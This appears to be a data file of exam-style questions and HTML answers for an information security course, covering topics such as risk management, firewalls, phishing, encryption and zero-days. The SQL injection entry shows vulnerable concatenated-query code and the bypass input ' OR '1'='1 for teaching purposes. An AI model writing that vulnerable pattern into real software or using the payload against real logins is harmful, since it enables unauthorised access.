  {q:"What is risk management in information security?",u:"Unit 01",a:`<span class="utag">Unit 01</span><p><strong>Risk management</strong> is the process of identifying, assessing, and controlling information security risks to an acceptable level. Since eliminating all risk is impossible and prohibitively expensive, risk management helps organisations prioritise security investments where they have the most impact.</p><p><strong>Risk management process (4-step cycle):</strong></p><ul><li><strong>1. Risk Identification:</strong> Enumerate assets (servers, databases, software, data, people), identify threats that could harm them, and identify vulnerabilities in current controls. Asset inventory is the foundation — you cannot protect what you don't know you have.</li><li><strong>2. Risk Assessment:</strong> Evaluate each risk's likelihood (probability) and impact (severity). Qualitative: High/Medium/Low scale. Quantitative: ALE = ARO × SLE (Annual Loss Expectancy = Annualised Rate of Occurrence × Single Loss Expectancy). Risk = Asset Value × Threat Probability × Vulnerability factor.</li><li><strong>3. Risk Treatment (Response):</strong> Four options — <strong>Mitigate</strong> (apply security controls to reduce likelihood/impact), <strong>Transfer</strong> (cyber insurance, outsource to third party), <strong>Accept</strong> (acknowledge low-impact risk, no control applied), <strong>Avoid</strong> (stop the risky activity entirely).</li><li><strong>4. Risk Monitoring and Review:</strong> Continuously reassess — new threats emerge, systems change, controls degrade. Regular security audits, penetration tests, and vulnerability scans maintain awareness.</li></ul><p><strong>Frameworks:</strong> ISO/IEC 27001 (Information Security Management System), NIST SP 800-30, COBIT 5. Risk register documents identified risks, owners, treatment decisions, and status. <strong>Residual risk</strong> = risk remaining after controls are applied. Board/senior management must accept residual risk.</p>`},
  {q:"What is a firewall? Name two types.",u:"Unit 05",a:`<span class="utag">Unit 05</span><p>A <strong>firewall</strong> is a network security device (hardware, software, or both) that monitors and controls incoming and outgoing network traffic based on predefined security rules. It creates a barrier between trusted internal networks and untrusted external networks (internet).</p><p><strong>Key firewall functions:</strong></p><ul><li>Filter packets based on source/destination IP, port numbers, and protocol.</li><li>Enforce network access control policies.</li><li>Log traffic for audit and forensic purposes.</li><li>Block known malicious IPs and domains.</li></ul><p><strong>Two main types of firewalls:</strong></p><p><strong>1. Packet Filtering Firewall (Stateless):</strong> Inspects individual packets independently against a rule set (ACL — Access Control List). Rules check: source IP, destination IP, source port, destination port, protocol (TCP/UDP/ICMP). Does NOT track connection state — evaluates each packet in isolation.</p><ul><li>Advantage: Very fast, low resource consumption, implemented in routers.</li><li>Disadvantage: Cannot detect attacks spread across multiple packets; vulnerable to IP spoofing; cannot distinguish legitimate return traffic from attacks.</li><li>Example: Router ACLs (Cisco extended access lists).</li></ul><p><strong>2. Stateful Inspection Firewall (Dynamic Packet Filtering):</strong> Tracks the state of active network connections in a state table. Knows that a TCP packet is part of an established connection vs. an unsolicited inbound packet.</p><ul><li>Advantage: Much more secure — blocks unsolicited inbound packets that don't correspond to outgoing connections. Understands TCP handshake, FTP data channel dynamics.</li><li>Disadvantage: Higher resource consumption; state table can be exhausted in SYN flood attacks.</li><li>Examples: Cisco ASA, iptables (Linux), Windows Firewall.</li></ul><p>Modern <strong>Next-Generation Firewalls (NGFW)</strong> add deep packet inspection, application-layer filtering, IPS, and threat intelligence.</p>`},
  {q:"What is a VPN? How does it protect communication?",u:"Unit 05",a:`<span class="utag">Unit 05</span><p>A <strong>VPN (Virtual Private Network)</strong> creates an encrypted, secure tunnel over a public network (internet), allowing remote users and offices to communicate as if they were on a private network. The "virtual" refers to the logical private connection created over shared infrastructure.</p><p><strong>How a VPN protects communication:</strong></p><ul><li><strong>Encryption:</strong> All data transmitted through the VPN tunnel is encrypted (AES-256 is standard). Even if intercepted, the traffic is unreadable without the decryption key. This protects against eavesdropping on public Wi-Fi and ISP monitoring.</li><li><strong>Encapsulation/Tunnelling:</strong> Original packets are wrapped inside new packets with VPN headers. The outer packet's destination is the VPN server, not the actual destination — hiding the true communication path.</li><li><strong>Authentication:</strong> Both endpoints authenticate each other (certificates, pre-shared keys, username/password) before the tunnel is established — preventing man-in-the-middle attacks.</li><li><strong>IP masking:</strong> The client appears to have the VPN server's IP address on the internet — providing anonymity from destination servers and bypassing geo-restrictions.</li></ul><p><strong>VPN types:</strong></p><ul><li><strong>Remote Access VPN:</strong> Individual users connect to a corporate network from home or travel. Client software creates tunnel to VPN concentrator. Examples: Cisco AnyConnect, OpenVPN.</li><li><strong>Site-to-Site VPN (LAN-to-LAN):</strong> Two routers at different offices establish a permanent tunnel — entire office networks are connected securely without client software on each device. IPsec is the standard protocol.</li><li><strong>SSL/TLS VPN:</strong> Browser-based access using HTTPS — no client installation needed. Good for partners and contractors.</li></ul><p>VPN protocols: IPsec, OpenVPN, WireGuard (modern, fast), L2TP/IPsec, IKEv2.</p>`},
  {q:"What is an IDS? How does it differ from IPS?",u:"Unit 05",a:`<span class="utag">Unit 05</span><p>Both IDS and IPS are security monitoring systems that analyse network traffic or system activity for malicious patterns.</p><p><strong>IDS (Intrusion Detection System):</strong> Monitors network traffic or system logs and <em>alerts</em> administrators when suspicious activity matching known attack signatures or anomalous behaviour is detected. Passive system — observes and reports without interfering with traffic.</p><ul><li><strong>Placement:</strong> Connected to a network TAP or SPAN port — receives a copy of traffic without being in the data path.</li><li><strong>Action:</strong> Generates alerts, logs events, sends SNMP traps or emails. Administrator then manually investigates and responds.</li><li><strong>Advantage:</strong> No risk of blocking legitimate traffic (no false-positive blocking). Suitable for high-sensitivity environments.</li></ul><p><strong>IPS (Intrusion Prevention System):</strong> Also monitors for malicious activity but is <em>inline</em> in the traffic path — it can actively block, drop, or modify malicious packets in real-time without human intervention.</p><ul><li><strong>Placement:</strong> Deployed inline between network segments — all traffic passes through it.</li><li><strong>Action:</strong> Drops malicious packets, resets connections, blocks source IPs, alerts administrators.</li><li><strong>Advantage:</strong> Stops attacks automatically in real-time — no delay while administrator reviews alerts.</li><li><strong>Risk:</strong> False positives block legitimate traffic; inline position means IPS failure can disrupt network (must have bypass mode).</li></ul><p><strong>Detection methods (both IDS and IPS):</strong></p><ul><li><strong>Signature-based:</strong> Pattern-matching against known attack signatures (like antivirus). Fast, accurate for known attacks; cannot detect zero-days.</li><li><strong>Anomaly-based:</strong> Establishes a baseline of normal behaviour; alerts on deviations. Detects unknown attacks; higher false-positive rate.</li></ul><p>Modern NGFWs typically integrate IPS functionality.</p>`},
  {q:"What is social engineering? Give an example.",u:"Unit 06",a:`<span class="utag">Unit 06</span><p><strong>Social engineering</strong> is a psychological manipulation technique used by attackers to trick people into divulging confidential information, performing actions, or granting access — exploiting human psychology (trust, fear, authority, urgency, curiosity) rather than technical vulnerabilities.</p><p>"Social engineering bypasses the best technical security — the weakest link in any security chain is the human element." — Security professionals often say it's easier to trick a person than to hack a firewall.</p><p><strong>Common social engineering techniques:</strong></p><ul><li><strong>Phishing:</strong> Mass fraudulent emails/messages impersonating trusted entities (bank, IT department, government) to steal credentials or install malware.</li><li><strong>Spear phishing:</strong> Targeted phishing using personalised details about the specific victim (name, employer, recent transactions) for higher success rates.</li><li><strong>Vishing (voice phishing):</strong> Phone calls from fake "bank security" or "Microsoft tech support" demanding account access.</li><li><strong>Pretexting:</strong> Creating a fabricated scenario to extract information (fake HR manager requesting employee salary details).</li><li><strong>Baiting:</strong> Leaving infected USB drives in a car park — curiosity drives victims to plug them in.</li><li><strong>Tailgating/Piggybacking:</strong> Following an authorised person through a secured door without badging in.</li></ul><p><strong>Detailed example — CEO Fraud / BEC (Business Email Compromise):</strong> Attacker spoofs or compromises a CEO's email account. Sends urgent email to CFO: "I need you to wire $150,000 to this supplier account immediately for a confidential acquisition deal — do not discuss with anyone." Urgency + authority + secrecy bypass normal approval processes. BEC caused $43 billion in global losses 2016-2021 (FBI statistics).</p><p><strong>Prevention:</strong> Security awareness training, verify identity through separate channel before acting, enforce approval processes even under pressure.</p>`},
  {q:"What is phishing? How can it be prevented?",u:"Unit 06",a:`<span class="utag">Unit 06</span><p><strong>Phishing</strong> is a cyber attack where the attacker impersonates a legitimate, trusted entity (bank, employer, government agency, popular website) via email, SMS, or messaging platforms to trick victims into revealing sensitive information (passwords, credit card numbers) or downloading malware.</p><p><strong>How a typical phishing attack works:</strong></p><ol><li>Attacker sends mass email: "Your HDFC Bank account has been locked due to suspicious activity. Click here to verify immediately." With a spoofed sender address like hdfc-security@hdfc-bank-alert.com.</li><li>Email contains a link to a convincing fake website visually identical to the real bank's site.</li><li>Victim enters username, password, and OTP on the fake site.</li><li>Attacker harvests credentials in real-time and immediately logs into the real bank account.</li></ol><p><strong>Phishing variants:</strong></p><ul><li><strong>Spear phishing:</strong> Personalised — uses victim's name, employer, recent purchase details for credibility.</li><li><strong>Whaling:</strong> Targets high-value executives (C-suite).</li><li><strong>Smishing:</strong> Phishing via SMS — "Your parcel could not be delivered. Click link to reschedule."</li><li><strong>Vishing:</strong> Voice phishing via phone calls.</li></ul><p><strong>Prevention measures:</strong></p><ul><li><strong>User training:</strong> Regular phishing awareness — teach users to verify sender domains, hover over links before clicking, question urgency.</li><li><strong>Email security:</strong> Implement SPF, DKIM, DMARC — authenticates email sender and blocks spoofed emails.</li><li><strong>Multi-Factor Authentication (MFA):</strong> Even if credentials are stolen, attacker cannot login without the second factor.</li><li><strong>Browser filters:</strong> Safe browsing (Google, Microsoft) block known phishing sites.</li><li><strong>Anti-phishing tools:</strong> Email gateways (Proofpoint, Mimecast) scan and quarantine suspicious emails.</li><li><strong>Simulated phishing:</strong> Regular internal phishing tests measure and improve employee vigilance.</li></ul>`},
  {q:"What is a DoS/DDoS attack?",u:"Unit 06",a:`<span class="utag">Unit 06</span><p>A <strong>DoS (Denial of Service) attack</strong> is an attempt to make a network resource, server, or service unavailable to its intended users by overwhelming it with traffic or requests until it is exhausted and cannot respond to legitimate requests.</p><p><strong>DoS attack mechanisms:</strong></p><ul><li><strong>Volume-based:</strong> Flood target with massive amounts of traffic consuming all bandwidth. Examples: ICMP flood (ping flood), UDP flood.</li><li><strong>Protocol attacks:</strong> Exploit weaknesses in Layer 3/4 protocols. SYN flood: send thousands of SYN packets (TCP connection initiation) but never complete the handshake — server exhausts half-open connection table (backlog queue).</li><li><strong>Application layer attacks:</strong> HTTP floods — send large numbers of legitimate-looking HTTP requests that consume server CPU and memory processing them (Slowloris, R.U.D.Y.).</li></ul><p><strong>DDoS (Distributed Denial of Service):</strong> DoS attack launched from many (thousands to millions) of compromised machines simultaneously — forming a <em>botnet</em>. Each individual machine sends a moderate amount of traffic, but collectively the aggregate overwhelms even high-capacity targets. Far more powerful than single-source DoS and harder to block (cannot simply block one IP).</p><p><strong>Botnet:</strong> Network of malware-infected devices (zombies/bots) — PCs, IoT devices, servers — controlled by the attacker (botmaster) via C2 (Command and Control) server without their owners' knowledge.</p><p><strong>DDoS mitigation:</strong></p><ul><li>CDN and traffic scrubbing services (Cloudflare, Akamai) absorb/filter attack traffic.</li><li>Rate limiting and traffic throttling on edge routers.</li><li>Anycast network diffusion — distributes attack across multiple data centres.</li><li>Black hole routing (null routing) — drop all traffic to attacked IP as a last resort.</li></ul><p>Covered under IT Act S.66 in India.</p>`},
  {q:"What is data sovereignty? Why does it matter?",u:"Unit 04",a:`<span class="utag">Unit 04</span><p><strong>Data sovereignty</strong> refers to the principle that data is subject to the laws and governance of the nation in which it is physically stored or the nationality/domicile of the data subjects. When data crosses borders or is stored in foreign clouds, conflicting laws create legal and compliance challenges.</p><p><strong>Why data sovereignty matters:</strong></p><ul><li><strong>Legal jurisdiction:</strong> Data stored in the US is subject to US laws — including the CLOUD Act (2018) which allows US law enforcement to compel US cloud providers (AWS, Microsoft, Google) to hand over data even if stored abroad without foreign government notification.</li><li><strong>Conflicting regulations:</strong> EU GDPR prohibits transferring EU citizens' personal data to non-EU countries lacking "adequate protection" (notably before the EU-US Privacy Shield replacement). Indian data principals' data may need to stay within India under the Digital Personal Data Protection Act (DPDPA) 2023.</li><li><strong>Government surveillance:</strong> Intelligence agencies in the host country may access data without the data owner's knowledge.</li><li><strong>Law enforcement requests:</strong> Foreign governments may compel disclosure of data that violates the subject's home country privacy rights.</li></ul><p><strong>Data localisation:</strong> Some countries mandate that data about their citizens be stored and processed within national borders. Russia's data localisation law (2015) requires personal data of Russian citizens stored on servers within Russia. India's DPDPA 2023 restricts cross-border transfer of critical personal data.</p><p><strong>Cloud implications:</strong> Organisations must know where their cloud data physically resides. Azure/AWS/GCP offer region-specific data residency commitments (e.g., "data stays in India region"). Regulated industries (banking, healthcare, defence) often mandate on-premises or domestic cloud.</p>`},
  {q:"What is a digital signature? How is it created?",u:"Unit 07",a:`<span class="utag">Unit 07</span><p>A <strong>digital signature</strong> is a mathematical scheme that provides authentication, integrity, and non-repudiation for digital messages or documents. It is the digital equivalent of a handwritten signature — but far more secure, as any tampering with the signed document invalidates the signature.</p><p><strong>Creation process (using asymmetric cryptography):</strong></p><ol><li><strong>Hash:</strong> The signer runs the document through a cryptographic hash function (SHA-256) to produce a fixed-length message digest (hash). Even a single bit change in the document produces a completely different hash.</li><li><strong>Encrypt the hash:</strong> The signer encrypts the hash using their <em>private key</em> (asymmetric key pair). This encrypted hash IS the digital signature. Only the signer has the private key — proving identity.</li><li><strong>Attach:</strong> The digital signature is attached to or sent alongside the original document.</li></ol><p><strong>Verification process:</strong></p><ol><li>Recipient decrypts the signature using the signer's <em>public key</em> — recovers the original hash.</li><li>Recipient independently hashes the received document.</li><li>Compares two hashes: if identical — document is authentic (unchanged) and was signed by the private key holder. If different — document was tampered with or signature is forged.</li></ol><p><strong>Security properties:</strong></p><ul><li><strong>Authentication:</strong> Only private key holder could have created the signature.</li><li><strong>Integrity:</strong> Any modification invalidates the signature.</li><li><strong>Non-repudiation:</strong> Signer cannot deny signing — they are the only private key holder.</li></ul><p><strong>Legal status in India:</strong> IT Act 2000 Section 5 gives legal validity to electronic records signed with a digital signature issued by a licensed Certifying Authority (CA) — equivalent to a written signature. Used for Income Tax e-filing, e-tenders, and company registrations.</p>`},
  {q:"What is net neutrality?",u:"Unit 04",a:`<span class="utag">Unit 04</span><p><strong>Net neutrality</strong> is the principle that Internet Service Providers (ISPs) must treat all internet traffic equally, regardless of its source, destination, type, content, or who created it. ISPs should not block, throttle, or prioritise certain traffic for commercial reasons.</p><p><strong>What net neutrality prohibits:</strong></p><ul><li><strong>Blocking:</strong> ISPs cannot block access to legal websites, applications, or services. Telecom companies cannot block VoIP services (like Skype) that compete with their own calling revenue.</li><li><strong>Throttling:</strong> ISPs cannot slow down specific services or content types. Example: an ISP slowing Netflix streaming to push users toward its own video service.</li><li><strong>Paid prioritisation (fast lanes):</strong> ISPs cannot create premium "fast lanes" where content providers pay more for faster delivery to users. This would advantage large companies and disadvantage startups.</li></ul><p><strong>Why net neutrality matters:</strong></p><ul><li>Preserves the open, level playing field that enabled startups (Google, Facebook, Netflix) to compete with established companies without paying ISP gatekeepers.</li><li>Prevents ISPs from becoming content gatekeepers who curate what users can access.</li><li>Ensures freedom of speech and information access — ISPs cannot selectively slow or block political content.</li></ul><p><strong>Status globally:</strong> EU mandated net neutrality via the Open Internet Regulation (2016). India's TRAI (Telecom Regulatory Authority of India) upheld net neutrality through the Differential Pricing Prohibition (2016), triggered by Facebook's Free Basics controversy. The US see-sawed between net neutrality (Obama-era FCC 2015) and repeal (Trump-era FCC 2017) and reinstatement attempts (Biden 2024).</p>`},
  {q:"What is e-commerce law? Name one key regulation.",u:"Unit 04",a:`<span class="utag">Unit 04</span><p><strong>E-commerce law</strong> is the body of legal rules governing commercial transactions conducted electronically over the internet — covering areas such as online contracts, digital payments, consumer protection, privacy, intellectual property, and dispute resolution. As e-commerce generates billions of transactions annually, legal frameworks are essential to establish trust and accountability.</p><p><strong>Key legal issues in e-commerce:</strong></p><ul><li><strong>Contract formation:</strong> When is an online contract valid? When the customer clicks "I Accept" + pays = offer and acceptance complete. IT Act 2000 S.10A recognises contracts formed electronically as valid.</li><li><strong>Consumer protection:</strong> Online buyers cannot physically inspect goods. Consumer Protection Act 2019 and Consumer Protection (E-Commerce) Rules 2020 mandate return policies, refund timelines, seller disclosure.</li><li><strong>Payment security:</strong> PCI DSS (Payment Card Industry Data Security Standard) governs how merchants store, process, and transmit payment card data.</li><li><strong>Data privacy:</strong> Customer purchase data, browsing history, preferences must be protected under IT Act S.43A (sensitive personal data rules) and forthcoming DPDPA 2023.</li><li><strong>Cyber fraud:</strong> Credit card fraud, fake e-commerce sites, payment gateway scams — covered under IT Act S.66 and IPC S.420 (cheating).</li></ul><p><strong>One key regulation — Consumer Protection (E-Commerce) Rules, 2020 (India):</strong></p><ul><li>Marketplace e-commerce platforms (Amazon, Flipkart) must disclose seller information — name, address, contact, import/origin details.</li><li>Must have grievance officer contact published on website.</li><li>Prohibit flash sales that artificially limit supply.</li><li>Must not manipulate search results or use deceptive pricing.</li><li>Mandatory country-of-origin labelling for goods.</li></ul>`},
  {q:"What is cyber forensics? What is its goal?",u:"Unit 08",a:`<span class="utag">Unit 08</span><p><strong>Cyber forensics</strong> (digital forensics or computer forensics) is the discipline of collecting, preserving, analysing, and presenting digital evidence from computers, networks, mobile devices, and storage media in a manner that is legally admissible in a court of law.</p><p><strong>Primary goals of cyber forensics:</strong></p><ul><li><strong>Evidence collection:</strong> Gather digital evidence from computers, smartphones, cloud storage, network logs, emails, databases — without altering the original evidence.</li><li><strong>Incident reconstruction:</strong> Determine what happened, when, how, and who was responsible — reconstruct the attack timeline from forensic artifacts.</li><li><strong>Legal admissibility:</strong> Ensure evidence collection follows strict protocols (chain of custody) so evidence is accepted by courts.</li><li><strong>Criminal prosecution support:</strong> Assist law enforcement in building cases against cybercriminals.</li></ul><p><strong>Cyber forensics process (NIST SP 800-86):</strong></p><ol><li><strong>Identification:</strong> Identify potential evidence sources and devices.</li><li><strong>Preservation:</strong> Create a forensic image (bit-for-bit exact copy) of storage media. Hash the original (MD5/SHA-256) to prove it was not altered. Store original securely (chain of custody log).</li><li><strong>Analysis:</strong> Examine the forensic copy — recover deleted files (data remnants), analyse registry keys, browser history, email, logs, metadata, encrypted data, memory dumps.</li><li><strong>Documentation:</strong> Document all findings with timestamps, tool versions, and analyst notes.</li><li><strong>Presentation:</strong> Present findings in court-ready reports; expert witness testimony.</li></ol><p><strong>Tools:</strong> Autopsy, EnCase, FTK (Forensic Toolkit), Wireshark (network forensics), Volatility (memory forensics). Cyber forensics is crucial for investigating data breaches, ransomware, insider fraud, and cyberstalking cases under the IT Act and IPC.</p>`},
  {q:"What is the NSTISSC (McCumber Cube) security model?",u:"Unit 01",a:`<span class="utag">Unit 01</span><p>The <strong>McCumber Cube</strong> (developed by John McCumber, 1991; adopted by NSTISSC — National Security Telecommunications and Information Systems Security Committee) is a three-dimensional security model that provides a comprehensive framework for evaluating information assurance.</p><p><strong>Three dimensions of the McCumber Cube (3×3×3 = 27 cells):</strong></p><p><strong>Dimension 1 — Information States (where data exists):</strong></p><ul><li><strong>Storage:</strong> Data at rest on hard drives, databases, USB drives, backups.</li><li><strong>Transmission:</strong> Data in transit over networks (email, HTTP, VoIP).</li><li><strong>Processing:</strong> Data being actively used in RAM or being computed.</li></ul><p><strong>Dimension 2 — Security Services/Goals (what to protect):</strong></p><ul><li><strong>Confidentiality:</strong> Prevent unauthorised disclosure.</li><li><strong>Integrity:</strong> Prevent unauthorised modification.</li><li><strong>Availability:</strong> Ensure authorised access when needed.</li></ul><p><strong>Dimension 3 — Security Countermeasures/Controls (how to protect):</strong></p><ul><li><strong>Policies and Practices:</strong> Security policies, procedures, acceptable use policies, incident response plans.</li><li><strong>Human Factors:</strong> Security awareness training, background checks, least privilege, separation of duties.</li><li><strong>Technology:</strong> Firewalls, encryption, IDS/IPS, antivirus, access controls, authentication systems.</li></ul><p><strong>Using the model:</strong> Each of the 27 cells represents a unique intersection — e.g., "Confidentiality of Data in Transmission via Technology" = TLS/VPN encryption. Organisations can systematically identify gaps: "Do we have policies governing data confidentiality in processing (RAM scraping threats)?" The cube ensures no combination of state, goal, and countermeasure type is overlooked in security planning.</p>`},
  {q:"What is two-factor authentication (2FA/MFA)?",u:"Unit 07",a:`<span class="utag">Unit 07</span><p><strong>Two-Factor Authentication (2FA)</strong> — and its generalisation Multi-Factor Authentication (MFA) — is an authentication mechanism requiring users to prove their identity using two (or more) independent factors from different categories. Even if one factor is compromised (e.g., password stolen via phishing), the attacker cannot authenticate without the second factor.</p><p><strong>Three authentication factor categories:</strong></p><ul><li><strong>Something you know:</strong> Password, PIN, passphrase, security question answer. Weakest factor alone — can be guessed, phished, or stolen.</li><li><strong>Something you have:</strong> Smartphone (authenticator app, SMS OTP), hardware security key (YubiKey), smart card, token device (RSA SecurID). Requires physical possession.</li><li><strong>Something you are:</strong> Biometrics — fingerprint, face recognition, iris scan, voiceprint. Most convenient; some risk of false acceptance/rejection rates.</li></ul><p><strong>Common 2FA implementations:</strong></p><ul><li><strong>SMS OTP:</strong> One-time password sent via SMS. Widely deployed but vulnerable to SIM swapping attacks.</li><li><strong>TOTP (Time-based OTP):</strong> Google Authenticator, Microsoft Authenticator — generates a 6-digit code that changes every 30 seconds using HMAC-SHA1 + timestamp. Not susceptible to SIM swap.</li><li><strong>FIDO2/WebAuthn + hardware keys:</strong> YubiKey — strongest 2FA. Cryptographic challenge-response using public key cryptography. Phishing-resistant because key is bound to the specific website domain.</li><li><strong>Push notification:</strong> Approve sign-in from a secondary device (Duo Security, Microsoft Authenticator app prompt).</li></ul><p>2FA reduces account compromise risk by ~99.9% according to Microsoft security research. Every cloud account (Google, Microsoft 365, AWS) should have 2FA/MFA enabled. Banking regulations (RBI) and GDPR best practices mandate MFA for high-risk access.</p>`},
  {q:"What is encryption? Symmetric vs asymmetric?",u:"Unit 07",a:`<span class="utag">Unit 07</span><p><strong>Encryption</strong> is the process of transforming plaintext (readable data) into ciphertext (unreadable, scrambled data) using a mathematical algorithm and a key, so that only authorised parties with the correct decryption key can read it. It provides confidentiality — the C in the CIA triad.</p><p><strong>Symmetric encryption:</strong> The same key is used for both encryption and decryption. Both sender and receiver must possess the same secret key in advance.</p><ul><li><strong>Algorithms:</strong> AES (Advanced Encryption Standard — 128/192/256-bit keys, current gold standard), DES (56-bit, broken), 3DES (168-bit, slow), ChaCha20 (stream cipher).</li><li><strong>Advantages:</strong> Extremely fast — hardware-accelerated AES in modern CPUs encrypts at near wire speed (10+ GB/s).</li><li><strong>Disadvantage:</strong> Key distribution problem — how do Alice and Bob exchange the secret key securely before they can communicate? Cannot use a compromised channel to share the key.</li><li><strong>Use cases:</strong> Bulk data encryption (files, full-disk encryption — BitLocker, VeraCrypt), TLS session data, database encryption.</li></ul><p><strong>Asymmetric encryption (Public Key Cryptography):</strong> Uses a mathematically linked key pair — public key (freely shared) + private key (kept secret). Data encrypted with public key can only be decrypted with the matching private key, and vice versa.</p><ul><li><strong>Algorithms:</strong> RSA (2048/4096-bit), ECC (Elliptic Curve — smaller keys, stronger: 256-bit ECC ≈ 3072-bit RSA), Diffie-Hellman (key exchange).</li><li><strong>Advantages:</strong> Solves key distribution — publish public key openly; only you have the private key. Also enables digital signatures.</li><li><strong>Disadvantage:</strong> ~1000× slower than symmetric — unsuitable for bulk data.</li></ul><p><strong>Hybrid approach (TLS/SSL):</strong> Asymmetric encryption (RSA/ECDHE) is used to securely exchange a session key; symmetric encryption (AES) then encrypts all actual data — combining the security of asymmetric with the speed of symmetric. Used in HTTPS, VPN, S/MIME.</p>`},
  {q:"What is a zero-day vulnerability?",u:"Unit 08",a:`<span class="utag">Unit 08</span><p>A <strong>zero-day vulnerability</strong> is a software security flaw that is unknown to the software vendor and for which no official patch or fix exists. The name "zero-day" refers to the fact that the vendor has had zero days to develop and release a patch — meaning all users of the software are exposed from the moment the vulnerability is discovered or exploited.</p><p><strong>The lifecycle:</strong></p><ol><li><strong>Discovery:</strong> Researcher, hacker, or intelligence agency discovers the vulnerability.</li><li><strong>Zero-day period:</strong> Vulnerability exists but vendor is unaware. During this window, those who know can exploit it freely with no defence available.</li><li><strong>Exploitation:</strong> A zero-day exploit is the code or technique that weaponises the vulnerability. If exploited before disclosure, it is called a "zero-day attack."</li><li><strong>Disclosure:</strong> Responsible disclosure to vendor (CVD), or public disclosure. Vendor releases patch.</li><li><strong>Patching:</strong> Users apply the patch — vulnerability becomes a known, patchable CVE (Common Vulnerabilities and Exposures).</li></ol><p><strong>Why zero-days are so dangerous:</strong></p><ul><li>No patch available — traditional patch-management defences useless.</li><li>Signature-based antivirus/IPS often cannot detect novel exploits.</li><li>Attackers can maintain prolonged undetected access (APT — Advanced Persistent Threat).</li></ul><p><strong>Examples:</strong> Stuxnet (2010) — used 4 zero-days to target Iranian nuclear centrifuges. EternalBlue (NSA zero-day in Windows SMB, later leaked, used by WannaCry and NotPetya in 2017). Log4Shell (2021) — critical zero-day in Apache Log4j affecting millions of servers.</p><p><strong>Zero-day market:</strong> Governments and intelligence agencies pay millions for weaponised zero-days. Zerodium publicly pays up to $2.5 million for iOS zero-days.</p>`},
  {q:"What is SQL injection? How is it prevented?",u:"Unit 08",a:`<span class="utag">Unit 08</span><p><strong>SQL injection (SQLi)</strong> is a web security vulnerability where an attacker injects malicious SQL code into user-input fields that are incorporated into database queries without proper sanitisation — manipulating the database query to execute attacker-controlled commands. It is consistently ranked #1 in the OWASP Top 10 web vulnerabilities.</p><p><strong>Classic example:</strong></p><div class="code">// Vulnerable code (C# ASP.NET)
string sql = "SELECT * FROM Users WHERE Username='" + username + "' AND Password='" + password + "'";
// Attacker enters: username = ' OR '1'='1
// Resulting SQL: SELECT * FROM Users WHERE Username='' OR '1'='1' AND Password=''
// '1'='1' is always true — attacker bypasses authentication and gets ALL users!</div><p><strong>SQLi attack types:</strong></p><ul><li><strong>Classic/In-band:</strong> Results returned directly in response.</li><li><strong>Blind SQLi:</strong> No direct output — attacker infers data from True/False responses or timing differences (time-based blind SQLi using SLEEP() function).</li><li><strong>Out-of-band:</strong> Exfiltrates data via DNS or HTTP requests.</li><li><strong>Second-order:</strong> Injected SQL stored in DB and executed later.</li></ul><p><strong>Prevention:</strong></p><ul><li><strong>Parameterised queries / Prepared statements:</strong> The most effective defence. SQL structure is defined first; user input is passed as separate parameters — cannot alter query structure.</li></ul><div class="code">// Safe parameterised query (C# ADO.NET)
var cmd = new SqlCommand("SELECT * FROM Users WHERE Username=@u AND Password=@p", conn);
cmd.Parameters.AddWithValue("@u", username);
cmd.Parameters.AddWithValue("@p", password);</div><ul><li><strong>ORM (Entity Framework, Dapper):</strong> Automatically parameterises — significantly reduces SQLi risk.</li><li><strong>Input validation:</strong> Reject unexpected characters; whitelist allowed input patterns.</li><li><strong>Least privilege:</strong> Database account used by the app should only have SELECT/INSERT/UPDATE — never DROP or TRUNCATE.</li><li><strong>WAF:</strong> Web Application Firewall detects and blocks common SQLi patterns at the network level.</li></ul>`},
  {q:"What is an SSL/TLS certificate? Why do websites need one?",u:"Unit 07",a:`<span class="utag">Unit 07</span><p>An <strong>SSL/TLS certificate</strong> (commonly called an SSL certificate, though modern implementations use TLS — Transport Layer Security) is a digital certificate issued by a trusted Certificate Authority (CA) that authenticates a website's identity and enables encrypted HTTPS communication.</p><p><strong>What a certificate contains:</strong></p><ul><li>Subject's domain name (Common Name or Subject Alternative Names).</li><li>Certificate holder's public key.</li><li>Issuing CA's name and digital signature (validates authenticity).</li><li>Validity period (typically 1-year certificates).</li><li>Certificate serial number and thumbprint.</li></ul><p><strong>Why websites need a TLS certificate:</strong></p><ul><li><strong>Authentication:</strong> Proves the website is genuinely owned by the organisation it claims to be — prevents man-in-the-middle attacks where an attacker impersonates a legitimate site. Browser verifies the CA's signature on the certificate.</li><li><strong>Encryption:</strong> Enables HTTPS — all data exchanged between browser and server (login credentials, payment data, personal information) is encrypted and cannot be read by ISPs, Wi-Fi sniffers, or intermediaries.</li><li><strong>Integrity:</strong> TLS message authentication codes (MAC) detect any in-transit tampering.</li><li><strong>Trust indicators:</strong> Padlock icon in browser address bar builds user confidence. EV (Extended Validation) certificates additionally show the organisation name.</li><li><strong>SEO and compliance:</strong> Google prioritises HTTPS sites. PCI DSS, HIPAA, and GDPR require encryption of sensitive data in transit.</li></ul><p><strong>Certificate types:</strong> DV (Domain Validated — basic, automated), OV (Organisation Validated — verifies company identity), EV (Extended Validation — rigorous identity verification, shows company name). Let's Encrypt provides free DV certificates via automated ACME protocol. TLS 1.3 (2018) is the current standard — TLS 1.0/1.1 are deprecated.</p>`},
  {q:"What is access control? Name the three types.",u:"Unit 05",a:`<span class="utag">Unit 05</span><p><strong>Access control</strong> is the security mechanism that regulates who or what can view, use, or perform operations on resources in a computing environment. It enforces the principle of least privilege — users and processes get only the permissions they need, nothing more.</p><p><strong>Access control components:</strong></p><ul><li><strong>Authentication:</strong> Verifying identity (who are you? — login, biometrics, certificates).</li><li><strong>Authorisation:</strong> Determining what an authenticated identity is allowed to do (what can you do? — permissions, ACLs).</li><li><strong>Accounting/Auditing:</strong> Tracking what was done (what did you do? — logs, audit trails).</li></ul><p><strong>Three main access control models:</strong></p><ul><li><strong>1. DAC (Discretionary Access Control):</strong> Resource owners control access to their own resources at their discretion. They set permissions on files/objects (e.g., Windows NTFS file permissions — owner decides who can read/write). Flexible but relies on owners making correct decisions. Used in: most commercial OS file systems.</li><li><strong>2. MAC (Mandatory Access Control):</strong> A central authority assigns security labels/clearances to subjects (users) and objects (data). Access is based on security classification levels — confidential, secret, top secret. Users cannot change access controls even for objects they own. Used in: government/military systems (Bell-LaPadula model). Very rigid but highly secure.</li><li><strong>3. RBAC (Role-Based Access Control):</strong> Access rights are grouped by organisational roles; users are assigned roles. Example: "Manager" role can approve expenses and view reports; "Clerk" role can only enter transactions. Simplifies administration — change a role definition, not individual user permissions. Most widely used in enterprise systems, databases, and cloud IAM (AWS, Azure AD).</li></ul><p>ABAC (Attribute-Based Access Control) is a fourth modern model — grants access based on user attributes, resource attributes, and environment conditions (e.g., location, time of day).</p>`},
